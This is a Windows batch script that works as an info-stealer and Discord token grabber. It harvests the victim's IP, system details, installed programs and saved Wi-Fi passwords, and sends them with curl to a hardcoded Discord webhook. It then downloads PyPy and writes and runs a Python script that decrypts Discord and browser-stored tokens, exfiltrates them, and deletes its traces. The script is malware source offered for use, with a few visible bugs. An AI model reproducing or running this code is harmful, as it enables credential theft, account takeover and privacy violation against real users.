@echo off
set currentdir=%~dp0
cd %currentdir%

set webhook=https://discord.com/api/webhooks/1019410553988452412/fBW_jUgzf7KVAY1Np17VSYutaTNrKhiJ2snTLMjMRLFGtcHB1NuhRW8BFDlOnHgo7G2P

::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810

:check_Permissions
    

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )

:starti
::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
set /a killdc = 0

::get ip
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt

::gets a list of all installed programms
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "


::gets informations about the pc
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
   
)

:aftertesti

::gets the ipconfig (also local ip)
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

::gets the info about the netstat
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

::sends the launcher_accounts.json if minecraft exist
if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end

::sends the username, ip, current time, and date of the victim


curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

::sends all files
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%

::back to my code!

cd %userprofile%\AppData\Local\Temp
curl -O https://downloads.python.org/pypy/pypy3.9-v7.3.9-win64.zip
powershell Expand-Archive -Path pypy3.9-v7.3.9-win64.zip -DestinationPath %userprofile%\AppData\Local\Temp
cd %userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\

echo from re import findall >%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo import os >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo from Crypto.Cipher import AES >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo from win32crypt import CryptUnprotectData >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo from json import loads >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo from base64 import b64decode >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo global all_tokens >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo all_tokens = [] >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo local = os.getenv("LOCALAPPDATA") >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo roaming = os.getenv("APPDATA") >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo temp = os.getenv("TEMP") >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo paths = { >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Discord': local + '\\discord\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Discord Canary': local + '\\discordcanary\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Lightcord': local + '\\Lightcord\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Discord PTB': local + '\\discordptb\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Opera': local + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Opera GX': local + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Amigo': roaming + '\\Amigo\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Torch': roaming + '\\Torch\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Kometa': roaming + '\\Kometa\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Orbitum': roaming + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'CentBrowser': roaming + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     '7Star': roaming + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Sputnik': roaming + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Vivaldi': roaming + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Chrome SxS': roaming + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Epic Privacy Browser': roaming + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Microsoft Edge': roaming + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Uran': roaming + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\', >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\' >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo } >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo path2 = roaming + '\\discord\\Local Storage\\leveldb\\' >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo path3 = roaming + '\\discord\\' >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo def gettokens(paths): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     tokens = [] >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     for file_name in os.listdir(paths): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         if not file_name.endswith(".log") and not file_name.endswith(".ldb"): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             continue >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         for line in [x.strip() for x in open(f"{paths}\\{file_name}", errors="ignore").readlines() if x.strip()]: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", r"mfa\.[\w-]{84}"): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                 for token in findall(regex, line): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                     all_tokens.append(token) >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     return tokens >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo def get_master_key(path3): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     with open(f'{path3}Local State', 'r', encoding='utf-8') as f: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         key = loads(f.read())['os_crypt']['encrypted_key'] >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         return key >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo penis = get_master_key(path3) >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo def get_discord_token(path2): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     tokens_discord = [] >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     for subdir, dirs, files in os.walk(path2): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         for file in files: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             if not file.endswith(".log") and not file.endswith(".ldb"): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                 continue >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             else: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                 try: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                     with open(f"{path2}{file}", "r+", errors='ignore') as f: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                         for i in f.readlines(): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                             i.strip() >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                             regex2 = '''dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\''' >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                             regex3 = r']*^"' >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                             regex4 = regex2 + regex3 >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                             for values in findall(regex4, i): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                                 tokens_discord.append(values) >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                 except: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo                     pass >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     for token in tokens_discord: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         all_tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(penis)[5:])) >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo def decrypt(buff, master_key): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     try: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode() >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     except Exception as e: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         return "An error has occured.\n" + e >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo if __name__ == '__main__': >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     for platfrom, path in paths.items(): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         if not os.path.exists(path): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             continue >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         for tokens in gettokens(path): >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             print("finished") >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     remove_dup = [*set(all_tokens)] >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo     with open(f"{temp}\\tokens.txt", "w", encoding="utf-8", errors="ignore") as f: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo         for shits in remove_dup: >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py
echo             f.write(shits + "\n") >>%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\\kdot.py

pypy pypy -m ensurepip
pypy -m ensurepip --upgrade
set PATH=%PATH%;%userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\Scripts
pypy -m pip install pycryptodome
pypy -m pip install pypiwin32
pypy -m %userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\kdot.py

curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%

del %userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64\kdot.py
del %userprofile%\AppData\Local\Temp\tokens.txt
del %userprofile%\AppData\Local\Temp\pypy3.9-v7.3.9-win64.zip
del %localappdata%\Temp\ip.txt
del %localappdata%\Temp\ipp.txt
del %localappdata%\Temp\sysi.txt
del %localappdata%\Temp\System_INFO.txt
del %localappdata%\Temp\netstat.txt
del %localappdata%\Temp\programms.txt
del %localappdata%\Temp\uuid.txt
del %localappdata%\Temp\wlan.txt